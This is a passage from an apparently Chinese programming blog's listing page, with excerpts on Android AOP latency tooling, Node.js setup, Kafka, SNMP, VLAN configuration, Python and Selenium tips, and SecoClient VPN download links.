AOP作为Spring的关键组件之一，在服务端开发中已经广泛应用。在安卓平台上也有一些AOP的工具框架，包括AspectJ，JavaSsist，ASMDex，DexMaker。本文则介绍了AOP的一些基本概念，然后结合使用AspectJ和dynamic feature插件化技术，设计开发一款安卓app可视化的时延测试工具。其中aspectJ解决类与方法级别的解耦问题，插件化则解决模块级别的解耦问题，结合两者使用最终将测试工具app与需要监测行为的app做到极致解耦的效果。
/ 何为AOP？ /
下图是我们提到的问题场景，采用OOP的解决方案需要在多个类的不同方法中插入一些模板代码，此时我们面对的不是一个类或者一个对象，而是多个对象中的多个方法。编程过程就像把这些类切开，然后在每个切点插入一些模板代码。
AOP的解决方式就是让这些模板代码只在一处实现，但是多次注入。代码注入是解决问题的关键之处。根据注入的时机，可以将代码注入区分为：
运行时注入：必须明确调用额外的代码，比如采用动态代理。这个可能不算真正意义上的代码注入。
加载时注入：当Dalvik或者ART虚拟机加载class文件时进行修改，编织二进制文件或者dex文件。
编译时注入：在编译过程中添加自定义的步骤，生成apk之前进行修改，编织源文件。
AOP的一些基本名词概念
JointPoint：代码连接点，注入代码的地方，如上图中的functionA。
PointCut：切点，声明切入规则，匹配连接点的一个表达式。可以指定具体的包名类名方法名，也可以是具有相似名称的方法集合，或者拥有相同注解的方法集合。
Advice：切面在切入点采取代码注入的操作方式，常用的有before、after、around，分别表示在切入点之前、之后、或者切入点前后均执行代码注入。
Aspect：切面，pointcut和advice组合成一个aspect，在aspectj中是用@Aspect注解的一个类。
Weaving：编织，将代码注入到切入点的整个过程。
/ 实践应用 /
本案例来自于实际项目开发中碰到的问题。问题背景是app中从用户执行点击操作到最终展示结果概率性时延超标，需要分析中间哪些环节发生了问题，整个业务流程包括相机拍照、图片处理、网络请求、界面初始化、加载网页等多个耗时操作。通常做法是去抓取日志进行分析，但是发生超标的场景不稳定，只是概率出现，每次都要重复分析大量log，定位多个环节，效率低下。
这时候就希望有一款可视化工具，在用户操作的同时把各环节时延显示出来。将该问题场景简化为一个网页加载的demo。下图所示，点击app中的button，加载对应的网页，左上方的工具则会把网页加载各个资源的耗时显示出来。可以看出，从点击按钮到最终百度网页完成加载耗时773ms。
模块设计
Demo里模块设计如下图所示，将工具显示界面的代码全部放在插件apk中，使用一个service作为插件入口，service通过悬浮窗加载一个recyclerview，接收来自baseapk的消息，添加显示到recyclerview中。baseapk中包含插件入口类TimeLagPluginEntry，该类提供绑定插件入口service与发送消息的接口，入口类采用单例模式，方便调用。baseapk中的织入类TimePointAspect制定切点规则及织入的代码，最终在MainActiviy中标记好的连接点方法中插入sendMessage模板代码。
编码实现
引入aspectj，工程顶级build.gradle引入依赖。
dependencies { classpath 'com.android.tools.build:gradle:3.4.1' classpath 'com.hujiang.aspectjx:gradle-android-plugin-aspectjx:2.0.8' } app module应用插件：
apply plugin: 'android-aspectjx' 添加编译依赖项：
compileOnly 'org.aspectj:aspectjrt:1.8.+' 新建一个注解，用于标记连接点，命名为TimePoint，应用范围为method，保留时间范围为运行时runtime。有两个属性方法，value用来表示当前发生的事件名称，比如用户点击、加载资源。type为0用来标识统计时延的起始点。
@Target(ElementType.METHOD) @Retention(RetentionPolicy.RUNTIME) public @interface TimePoint { String value(); int type(); } 然后在主程序中需要统计时延的方法上添加注解，按钮点击监听。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c83a0dd54b58c501edc3b1fd4b4b31b2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c84475778d2bc37d0bb949f10cffef4e/" rel="bookmark">
			windows安装node.js的详细步骤以及安装时由于改变存储路径导致引起的不是内部或外部命令，也不是可运行的程序错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装node.js： 安装node.js只需要去[官方网站](http://nodejs.cn/download/)下载即可，下载安装包msi的话直接点击安装，选择next等待安装即可，目录可以根据自己喜好。还有一种是压缩包，压缩包的话不需要安装，但是需要自己手动配置环境变量。可以使用以下命令进行查看是否安装成功。 //查看node版本 node -v //查看npm版本 npm -v //如果使用安装包，不需要配置环境变量，安装的时候会自动配置。否则需要配置环境变量， //将安装目录放在path中，也就是有node.exe这个文件的当前目录 //npm 更新到最新版本 npm i -g npm //npm 更新到指定版本 npm i -g npm@8.19.1 修改npm配置： 可以根据需求决定是否需要配置
//可以有两种方法，两种方法都需要配置环境变量 //①直接在‘C:\Users\用户名’这个目录下找到一个.npmrc的文件(没找到就直接通过命令)，直接修改其中的配置即可，配置如下 //使用淘宝的镜像源可以提高下载速度 registry=https://npm.taobao.org/mirrors/node //全局的下载和缓存目录，使用npm进行全局下载就会放在设置的目录下，否则会默认放在c盘 prefix=D:\node\node_global cache=D:\node\node_cache //②另一种是通过命令行进行设置 npm config set registry https://registry.npm.taobao.org npm config set prefix "D:\node\node_global" npm config set cache "D:\node\node_cache" //再通过命令查看是否修改成功 list == ls npm config list //或查看所有详细配置 npm config ls -l //最后需要配置环境变量，直接将prefix 这个路径放到path里面即可， //否则使用npm全局安装的软件，使用的话会报找不到命令，如下个步骤安装的cnpm， //如果是没有将prefix的路径配置到环境变量，就会使用不了cnpm命令，可以用cnpm -v进行验证 安装cnpm： 可以通过这种方式来控制镜像源，使用npm安装，cnpm会继承npm的安装路径
npm i -g cnpm --registry=https://registry.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c84475778d2bc37d0bb949f10cffef4e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15f85dacf5f53fbd465cdefc08a678f2/" rel="bookmark">
			二进制、八进制、十进制、十六进制间相互转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.1 常见的进制1.2 进制间如何转换1.3 十进制转换二、八、十六进制1.4 二、八、十六进制转换成十进制1.5 二进制转换成八、十六进制(第一种方法)1.6 二进制转换成八、十六进制(第二种方法)1.7 八、十六进制转换成二进制(第一种方法)1.8 八、十六进制转换成二进制(第二种方法) 1.1 常见的进制 二进制
01：就是0和1的组合 02：0、1 八进制
01：就是0至7的组合 02：0、1、2、3、4、5、6、7 十进制
01：就是0至9的组合 02：0、1、2、3、4、5、6、7、8、9 十六进制
01：就是0-9和A-F间的组合，A等于10,B等于11,C等于12,D等于13,E等于14,F等于15 02：0、1、2、3、4、5、6、7、8、9、a、b、c、d、e、f 1.2 进制间如何转换 问：二进制、八进制、十进制、十六进制能否直接进行互相转换。
答：可以( 这是站在直接给出答案的角度来回答的)，如下图所示：
进制之间如何进行互相转换呢？这个我们就要从换算步骤来说，如下所示：
## 01：十进制转换二、八、十六进制 一步到位,可以直接转换。 ## 02：二、八、十六进制转换成十进制 一步到位,可以直接转换。 ## 03：二进制转换成八、十六进制： A：第一种方法：(初次好理解) a:先转换成十进制(02) b:再由十进制转换成八、十六进制(01) B：第二种方法:(推荐) a:先分组,从右往左,二转八是三位一组,二转十六是四位一组。不够在左侧用零填充。 b:各组内按二转10出结果，最后结果是各组的结果相拼接。 ## 04:八、十六进制转换成成二进制 A：第一种方法：(初次好理解) a:先转换成十进制(02) b:再由十进制转换成二、十六进制(01) B：第二种方法：(推荐) a:拆分,例如：将76进行拆分,拆分后就是7和6 b:各位转换成二进制:就是将7和6分别转换成二进制 c:各位二进制的结果进行拼接 1.3 十进制转换二、八、十六进制 这里是将十进制（整数）转换成二进制、八进制、16进制，以25为例。思维图如下所示：
十进制转换成2进制
十进制转换成8进制
十进制转换成16进制
1.4 二、八、十六进制转换成十进制 注意：这里将其它进制（二、八、十六）转换成十进制。
二进制转换成十进制：以 1101101110 为例
八进制转换成十进制：以 76 为例
16进制转换成十进制：以 19ad 为例
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/15f85dacf5f53fbd465cdefc08a678f2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/649e091380170630ec8e5c9de4333efa/" rel="bookmark">
			如何在项目中使用kafka?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.如何在项目中使用kafka?
1.1)因为kafka的使用依赖于zookeeper(https://mp.weixin.qq.com/s/geR3pDw_Yjhmu8KMsXQosg在kafka v2.8版本后将zookeeper也集成在了服务中在kafka v2.8版本后官网取消了kafka依赖zookeeper集群的机制,采用内置kraft的方式),配置zookeeper的信息,即需要在kafka/config/zookeeper.properties配置zookeeper服务运行期间产生的数据存放位置dataDir,
1.2)在kafka/config/server.properties 中配置kafka服务运行期间产生的log文件的位置，(注意:Kafka 使用消息日志（Log）来保存数据)
1.3)运行zookeeper和kafka服务,
./bin/zookeeper-server-start.sh ./config/zookeeper.properties ./bin/kafka-server-start.sh ./config/server.properties 1.4)在spring中引入kafka依赖
&lt;dependency&gt; &lt;groupId&gt;org.springframework.kafka&lt;/groupId&gt; &lt;artifactId&gt;spring-kafka&lt;/artifactId&gt; &lt;/dependency&gt; spring中如何使用kafka?
发送消息：利用KafkaTemplate类-&gt;kafkaTemplate.send(topic, message);
消费消息：利用注解@KafkaListener(topics = {**},groupId = "")
1.5)应用：如何在项目中使用kafka实现发布系统通知功能？
用户进行关注,评论,回复等行为都是时刻在发生的.如果当某个用户进行关注/评论/回复(上游服务)后,系统立即对此请求进行处理，即向被关注/评论/回复的用户发送系统通知(下游服务)这一功能,当用户关注,评论,回复行为异常活跃时,就会拖垮服务器或者数据库.
利用kafka消息引擎的异步,解耦,流量削峰的特性,来实现项目中系统通知的功能.
1.5.1)将用户进行关注/评论/回复的行为抽象为事件Event对象
@Component public class Event { String topic;//事件的主题(点赞/关注/回复) int userId;//事件的发起者 int entityType;//被点赞/关注/回复的实体类型(项目中只有三种:用户,帖子,评论) int entityId;//被点赞/关注/回复的实体id int entityUserId;//被点赞/关注/回复的实体的作者（实体类型为用户时，entityId==entityUserId） Map&lt;String, Object&gt; data = new HashMap&lt;&gt;();//事件中其他额外需要装的数据 /** 省略get/set方法 */ } 1.5.2)写生产者Producer类
@Component public class EventProducer { @Autowired private KafkaTemplate kafkaTemplate; public void fireEvent(Event event){ kafkaTemplate.send(event.getTopic(), JSONObject.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/649e091380170630ec8e5c9de4333efa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43af4274bc02f38eab3c233f43f61b2e/" rel="bookmark">
			离散数学 --- 谓词逻辑 --- 谓词合式公式推理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一部分 --- 推理形式和推理规则 1.谓词在拥有命题演算的基本蕴含公式的同时，还有着自己独有的基本蕴含公式
当我们的描述在个体和整体之间转换时，就需要进行量词的消去和添加
1.全称特指规则 --- US规则 --- 其实就是全称量词消去规则
2.全称量词消去有上面两种形式：
第一种消去全称量词的方式是代入任意一个属于给定个体域的个体变量（这个个体变量不能够被消掉全称量词后剩下的量词约束）
第二种消去全称量词的方式是代入任意一个属于给定个体域的个体常量
1.存在特指规则 ---ES规则 --- 就是用来消去存在量词的规则
2.关于函数替换 --- 下面的例子中的最后一行就是所谓的函数替换，如果我们不用关于这些变元的函数替换掉C的话，就会导致我们描述的是变量和常量之间的关系，这样的话无论如何描述都会导致描述错误。
所以我们要从根本上解决这个问题，将常量C也变为变量，且这个变量是和除常量C外的变元有关的变量 --- 获得这个变量的方法就是使用关于这些变量的函数来替换常量C --- f（除C以外的变元）
1.如果对于任意一个属于个体域的个体变量都能够为真的话，则在整个个体域中都为真
2.G(y)中无变元x的意思是：避免上面这种符号重复带来的歧义
1.在个体域有一个特定的个体常量能使公式成立 ，则能推出在个体域中存在个体常量使得公式成立
2.在个体域中任意一个个体变量能使公式成立，则也能推出在个体域中存在个体常量使得公式成立
第二部分 --- 综合推理方法 1.P表示的是前提，T表示的是通过前提/中间结果推导出的结果
2.规则CP是附加前提规则
3.间接证明方法是反证法
4.没量词就用命题演算中的基本等价公式和基本蕴涵公式，有量词就用谓词中的基本演绎公式和基本蕴涵公式
1.P能推出Q，则P存在的时候Q也存在，但是上面的H(y)不等于H(s)，所以用原来的（2）式是推不出结论的，除非我们把（2）式中的H(y)修改为H(s)（ M(y)也同理 ）
1.如果不是通过存在特指规则（ES）来得到一个个体常量，而是通过全称特指规则得到一个个体常量的话，这个个体常量是任意的且对于全称量词而言是满足的，但由于它是任意的，也就是说它不一定满足存在推广（特指）规则能使公式成立的要求
此时如果用这个个体常量 + 存在推广规则来推回存在量词的话就可能导致错误
所以正确的步骤是先用存在特指规则指定一个个体常量，这样不经存在推广规则能用这个个体常量，全称推广（特指）规则也能使用这个个体常量
2.三步走战略：
1.利用特指规则消去量词
2.进行推导
3.利用推广规则找回量词
1.I是基本蕴涵公式，E是基本等价公式（Equal）
1.首先在无论是否使用反证法，前提都为真，然后反证法的步骤：
一.将结论的否定作为附加前提
二.通过结论的否定推出前提的否定
三.前提的否定为真和前提为真的同时存在 ---&gt; 构成矛盾式，也就是说我们通过结论的否定会推出一个矛盾式（永假公式），也就是说结论的否定为假 ---&gt; 则结论为真 ---&gt; 反证结束
（ps:在前提中没有假的情况下，我们通过前提推出的中间结果和结论都为真，如果前提中有假的情况的话，则根据前提推出的中间结果和结论都为假）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/914e90e58f7dff998d8ed9babbebf2d8/" rel="bookmark">
			【点云系列】PointNeXt: Revisiting PointNet&#43;&#43; with Improved Training and Scaling Strategies
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 概要2. 动机3. 方法3.1 PointNet++回顾3.2 PointNeXt3.2.1 训练策略优化3.2.2 网络结构优化 4. 实验5. 总结6. 参考 1. 概要 论文：https://arxiv.org/abs/2206.04670
代码：https://github.com/guochengqian/pointnext
简而言之，就是一套更有效的训练策略，简单有效。
2. 动机 观察1：3D点云领域的大多数工作专注于开发精巧的模块来提取点云的局部细节，例如 KPConv [3] 中的伪网格卷积以及 Point Transformer [4] 中的自注意力层。这些新提出的方法在各种任务中都远优于经典的点云理解网络PointNet++，给人的错觉是 PointNet++ 网络过于简单，无法学习复杂的点云表示。
结论1：在这项工作中，我们发现影响PointNet++ 性能的原因不在于其网络模块，而在于其陈旧的训练以及模型缩放策略。
创新点：
首先，我们发现SOTA方法的大部分性能增益源于改进的训练策略（即数据增强和优化技术）。例如，在训练过程中随机丢掉颜色信息，可以使得S3DIS上的性能提升5个点的mIoU. 遗憾的是，相比于神经网络结构的改进，训练策略的进步很少被公开提及和研究。其次，SOTA方法的另一大性能增益来自于模型规模的提升。然而，我们发现，简单地提高PointNet++ 的卷积数量以及channel size无法提高模型的精度。因此，模型缩放策略, 即如何有效地扩展模型的深度（用更多卷积层）和广度（用更大的channel size），是一个很值得研究的话题 3. 方法 3.1 PointNet++回顾 PointNet++ 使用U-Net结构：
编码器（Encoder）：使用一系列 Set Abstraction （SA）模块对点云特征进行层次化抽象解码器（Decoder）：使用相同数目的feature propagation对特征进行上采样 SA组成：下采样层+ 另据查询层+特征提取层（MLPs） + 聚合的Reduction层， 其中聚合表达为下式：
3.2 PointNeXt 整体的网络框架如下图所示： 整体架构与PointNet++是一致的。红色框为基于PointNet++的改进。改进
模型输入处增加一层额外MLP ；用于缩放模型架构的Inverted Residual MLP（InvResMLp）模块；decode部分与encoder对称的channel size；
3.2.1 训练策略优化 目标：寻找最优优化策略
数据增强：
简单数据增强：随机旋转、缩放、平移、抖动更强的数据增强：KPConv[3]随机失活（drop）部分颜色信息， 等超大模型青睐更强的数据增强手段； 结论：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/914e90e58f7dff998d8ed9babbebf2d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9688a012d4990bdf4ba4bdb5eb5ef009/" rel="bookmark">
			将C盘的软件已经移到了D盘，为什么C盘还是会出现变红或饱满的状态？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这种情况出现的原因可能是：只是把软件移到了D盘，但是软件默认的文件存储位置还是C盘 比如说像微信和QQ这些，我的处理方法如下：
1.找到设置
2.找到文件管理，在改变文件存储路径，然后确定就好（我的是已经移动好的，所以没办法向大家展示，相信大家到这一步，应该明白怎么做）
QQ也同理找到设置找到文件管理进行更改存储路径
还可以通过属性更改位置 比如说，将C盘的图片移到D盘
点击文件夹右击选择属性
选择移动，在这里我直接选择的是D盘tupian这个文件夹
点击应用，选择是，确定后，它就移动到了D盘tupian这个文件夹中
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/39ecec8d7fbf3473a772f464046ec5a9/" rel="bookmark">
			世界各国当日数据探索性分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2.2 读取世界各国当日数据 import chardet import pandas as pd # 查看文件编码格式 with open('./today_world.csv', 'rb') as f: data = f.read() encoding = chardet.detect(data)['encoding'] # 数据读取 today_world = pd.read_csv("./today_world.csv",encoding=encoding) # 展示前5行数据 print(today_world.head()) # 查看数据的基本信息 today_world.info() # 查看数据的描述性统计信息 today_world_des = today_world.describe(include='all') print(today_world_des) 2.3 计算各国当日现存确诊人数 import pandas as pd # 计算当日现存确诊 today_world['当日现存确诊'] = today_world['累计确诊']-today_world['累计治愈']-today_world['累计死亡'] today_world.head() 2.4 绘制当日现存确诊人数世界地图 # 将国家中文名称映射为英文名称 today_world['英文名称'] = today_world['名称'].replace(country_name['中文'].values,country_name["英文"].values) # 获取嵌套列表数据 heatmap_data = today_world[['英文名称','当日现存确诊']].values.tolist() import pyecharts # 调整配置项 import pyecharts.options as opts # Map类用于绘制地图 from pyecharts.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/39ecec8d7fbf3473a772f464046ec5a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a1470b3c7728c83fbae6e74ebe57196c/" rel="bookmark">
			迭代器使用及源码分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.以ArrayList为例 /** * @author 2902996750 */ public class TestIterator { public static void main(String[] args) { /* 因为list集合和set集合继承了collection接口，而collection接口又继承了Iterator接口 所以list和set集合可以实现迭代器。 而map集合没有继承Iterator接口，所以没有迭代器方法 */ System.out.println("-----迭代器遍历list集合-----"); List&lt;Integer&gt; list=new ArrayList&lt;&gt;(); list.add(1); list.add(2); list.add(2); list.add(3); Iterator&lt;Integer&gt; iterator = list.iterator(); while (iterator.hasNext()){ Integer next = iterator.next(); System.out.println(next); } System.out.println("-----迭代器遍历set集合-----"); Set&lt;Integer&gt; set=new HashSet&lt;&gt;(); set.add(1); set.add(2); set.add(3); set.add(1); Iterator&lt;Integer&gt; iterator1 = set.iterator(); while (iterator1.hasNext()){ Integer next = iterator1.next(); System.out.println(next); } } } 结果: -----迭代器遍历list集合----- 1 2 2 3 -----迭代器遍历set集合----- 1 2 3 二.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a1470b3c7728c83fbae6e74ebe57196c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bbcac7ff964e3d0e25ae4c31937ba51c/" rel="bookmark">
			3.0 rk平台如何操作GPIO
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 写在前面 1 使用系统默认的方式2 使用IO命令控制 写在前面 想操作一下GPIO的原因是wifi软重启的时候起不来，但是断电重启就可以，所以怀疑可能不是驱动的问题，有可能是电源引脚需要拉低拉高刺激他一下，将这段经历记录一下
以GPIO1_C0为例 说明RK平台如何使用GPIO系统
1 使用系统默认的方式 [root@px30_64:/]# cat /sys/kernel/debug/gpio GPIOs 0-31, platform/pinctrl, gpio0: gpio-2 ( |enable ) out hi gpio-5 ( |GTP_INT_IRQ ) in hi gpio-12 ( |GTP_RST_PORT ) in hi gpio-15 ( |hs_hp_switch ) out lo GPIOs 32-63, platform/pinctrl, gpio1:
gpio-48 ( |wlan_default_wlan_po) out hi
GPIOs 64-95, platform/pinctrl, gpio2:
gpio-72 ( |vcc_lcd ) out hi
gpio-77 ( |mdio-reset ) out hi
GPIOs 96-127, platform/pinctrl, gpio3:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bbcac7ff964e3d0e25ae4c31937ba51c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b42d8be47b0e811452d2ae9f5fbc07ea/" rel="bookmark">
			SNMP（Simple Network Management Protocol）——简单网络管理协议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、SNMP简介
1.背景
2.SNMP管理的网络架构
二、SNMP MIB
1.SNMP MIB简介
2.MIB分类
(1)公有MIB
（2）私有MIB
3.被管理设备的基本属性
（1）对象表示符
（2）对象的状态
（3）对象的访问权限
（4）对象的数据类型
三、SNMPv1工作原理
1.SNMPv1操作类型
2.SNMPv1报文格式
（1）Version
（2）Community
（3）SNMP PDU
（4）PDU Type
（5）Request ID
（6）Error Status
（7）Error Index
（8）Variable Bindings
（9）Enterprise
（10）Agent Addr
（11）Generic Trap
（12）Specific Trap
（13）Time Stamp
四、SNMPv2c工作原理
1.SNMPv2c报文格式
（1）Get-Request、Get-Next-Requset、Set-Request、Response和Inform PDU的格式
（2）SNMPv2c Trap PDU格式
（3）Get-Bulk-Request PDU格式
五、SNMPv3工作原理
1.SNMPv3操作类型
2.SNMPv3报文格式
一、SNMP简介 1.背景 SNMP是广泛应用于TCP/IP网络的一种通用网络管理协议，可以实现对全网中所有设备的集中管理，远比CLI和Web管理方式更加高效。而且，因为SNMP是国际通用协议，所以各大品牌设备都支持。一套SNMP的网络管理系统可以对不同种类和不同厂商的设备进行统一管理，从而提升网络的管理效率。
2.SNMP管理的网络架构 在SNMP中有两类重要的实体，一类是采用SNMP对网络设备进行监控、管理的应用层软件，在一套主机上运行着网络管理进程，使用UDP 162端口，可以被看成是SNMP客户端，每个被管理设备在配置了SNMP功能后，使用UDP 161端口和运行代理（Agent）进程，可以被看成是SNMP服务器，代理进程负责维护被管理设备的信息数据，并响应来自NMS的请求，把管理数据汇报给发送请求的NMS。
基于SNMP管理的网络架构
二、SNMP MIB 1.SNMP MIB简介 表面上就看，NMS管理的是设备，事实上管理的是设备商的一个个被管理对象，每台设备可能包括多个被管理对象，可以是设备中的某个硬件（如某个设备接口），也可以是在硬件、软件上配置的参数集合。SNMP通过MIB描述被管理设备商的各个对象。
被管设备上的代理进程收到NMS的请求信息，通过MIB完成响应的指令后，并把操作结果响应给NMS，当系统发声故障或者发生其他事件时，设备也会通过代理进程主动发从Trap信息给NMS，报告设备当前的状态变化。
SNMP中的MIB是一个分层结构，我们称为对象命名树，或对象标识符（OID）树
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b42d8be47b0e811452d2ae9f5fbc07ea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a42427ff0f53fe87f3055370ec963c0c/" rel="bookmark">
			神州数码云平台基础环境搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本次实验用的设备是神州数码CS6200一台和CRL1000
首先确保设备没有任何配置
1、首先创建两个VLAN我这里创建的是10和100
CS6200(config)#vlan 10;100 (加上这个;标点符号可以一下创建多个VLAN，也可以一个一个创建)
2、创建完以后分别将云平台的管理口和业务口加入VLAN （云平台一般是上业务下管理CRL1000是左管理右业务）
CS6200(config)#vlan 100
CS6200(config-vlan100)#switchport interface ethernet 1/0/1-2 （管理口至少分配两个端口，云平台和电脑各一个）
CS6200(config)#vlan 10
CS6200(config-vlan10)#switchport interface ethernet 1/0/10 （为了更好的分辨业务我选择10口）
3、配置VLAN的IP地址
CS6200(config)#int vlan 100
CS6200(config-if-vlan100)#ip add 192.168.100.1 255.255.255.0
CS6200(config)#int vlan 10
CS6200(config-if-vlan100)#ip add 192.168.10.1 255.255.255.0
4、配置云平台所需要的实例网段
CS6200(config)#vlan 70 （这个VLAN可以随便起我弄70是代表它是70网段）
CS6200(config-vlan70)#int vlan 70
CS6200(config-if-vlan70)#ip add 10.10.70.254 255.255.255.0
5、现在跟实例是不通的需要让业务口允许所有VLAN通过
CS6200(config)#interface ethernet 1/0/10
CS6200(config-if-ethernet1/0/10)#switchport mode trunk CS6200(config-if-ethernet1/0/10)#switchport trunk allowed vlan all （允许所有VLAN通过）
6、查看状态看接口是否通信
CS6200(config)#show ip interface brief Index Interface IP-Address Protocol
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a42427ff0f53fe87f3055370ec963c0c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01034e8786ef77ccf2ba0253353d717d/" rel="bookmark">
			Python使用selenium时使用find_elements_by_class_name导致找不到元素
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录
一、问题背景
二、解决
2.1、单属性查找
2.2、空格替换
一、问题背景 在使用selenium爬虫时想找到页面中所有 class = c-id text-left 的元素，这个需求无疑是使用find_elements_by_class_name来查找，但是问题在于没有查找到，返回了一个空列表。代码及结果如下：
# 循环进入所以任务详情页 all_task = driver.find_elements_by_class_name('c-name text-left') print(f'result return : {len(all_task)}') ''' result return : 0 ''' 二、解决 也是上网看了下这个问题，大概意思是这个class属性有空格时表明他有多个个class属性，以本文的c-id text-left举例，class的属性有c-id及text-left两个，并不是一个整体。我总结的解决方法有两种。
2.1、单属性查找 顾名思义即是在查找的时候只需要放入一个属性即可。值得注意的是你必须要保证你放入的属性是你想找到元素的唯一。
# case 1 all_task = driver.find_elements_by_class_name('c-id') print(len(all_task)) # case 2 all_task = driver.find_elements_by_class_name('text-left') print(len(all_task)) 2.2、空格替换 将空格替换为点（.）即可，也能满足需求。
# 循环进入所以任务详情页 all_task = driver.find_elements_by_class_name('c-id.text-left') print(len(all_task)) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8f683015f893cceb11f38ed0bc518a1a/" rel="bookmark">
			【Python基础语法】总结(一)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 數字、字串的基本運算 有序列表的基本运算 集合、字典的基本運算 流程控制：if 判斷式 流程控制：迴圈基礎，while 迴圈、for 迴圈 迴圈進階控制，break、continue、else 命令 函式基礎：定義並呼叫函式 函式参数详解：参数预设值、名称、长度参数 Module 模組的載入與使用 建立geometry模组，载入使用
Package 封包的設計與使用 文字檔案的讀取和儲存 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/173395b0b02ccafc46b537baef1e25df/" rel="bookmark">
			secoclient全版本下载分享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 工作需要使用 secoclient，同事们大多都用 Windows环境。客户提供的客户端也是Windows版本的。这就让使用Mac几个同事难受啦。用Windows虚拟机？
根据我的经验，一般的VPN客户端都会有Mac版本的。网上搜了一圈果然是支持 Mac 版本的。
《HUAWEI SecoClient客户端 管理员指南》
https://support.huawei.com/enterprise/zh/doc/EDOC1000141430/d385803f
我跟据上面这文档在华为的官网找了20几分钟竟然没找到。为了下载这个Mac版本的secoclient还专门注册了华为的账号。我对我的智商产生了严重的怀疑，下载个程序都不会。
有洁癖的网友，建议在华为官网找找官方版本的。我放弃了，我没找到（我猜可能是我刚注册的用户权限低，看不到）。
华为SSLVPN客户端全版本下载 工具名称
secoclient
下载方法：下面的超链接上鼠标右键 =》新标签页打开 就可以正常下载了，直接点好像会下载失败。
如果还不能下载，就复制超链接到迅雷里下载。
Android secoclient-android-7.0.2.26.apk
http://www.corem.com.cn/sites/default/files/tools/secoclient/secoclient-android-7.0.2.26.apk
iOS secoclient-iOS-7.0.2.26.ipa
http://www.corem.com.cn/sites/default/files/tools/secoclient/secoclient-iOS-7.0.2.26.ipa
linux 32bit secoclient-linux-32-7.0.2.26.run
http://www.corem.com.cn/sites/default/files/tools/secoclient/secoclient-linux-32-7.0.2.26.run
linux 64net secoclient-linux-64-7.0.2.26.run
http://www.corem.com.cn/sites/default/files/tools/secoclient/secoclient-linux-64-7.0.2.26.run
macOS secoclient-macosx-7.0.2.26.tar.gz
http://www.corem.com.cn/sites/default/files/tools/secoclient/secoclient-macosx-7.0.2.26.tar.gz
windows32bit secoclient-win-32-7.0.2.26.exe
http://www.corem.com.cn/sites/default/files/tools/secoclient/secoclient-win-32-7.0.2.26.exe
windows64bit secoclient-win-64-7.0.2.26.exe
http://www.corem.com.cn/sites/default/files/tools/secoclient/secoclient-win-64-7.0.2.26.exe
百度云盘 链接: https://pan.baidu.com/s/1fapzDwYlADbEgt9XplftnQ?pwd=ghep 提取码: ghep
补充 2021年4月7日补充，有小伙伴遇到MacOS big sur 无法正常使用的情况，我这确实没有发生，具体原因我也不清楚。我和我身边的小伙伴都可以正常使用。截图如下：
我专门卸载重新安装，也完全可以使用。
安装过程传送门：https://blog.csdn.net/lxyoucan/article/details/115488021
参考文档 http://www.corem.com.cn/index.php/service/tools/secoclient
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
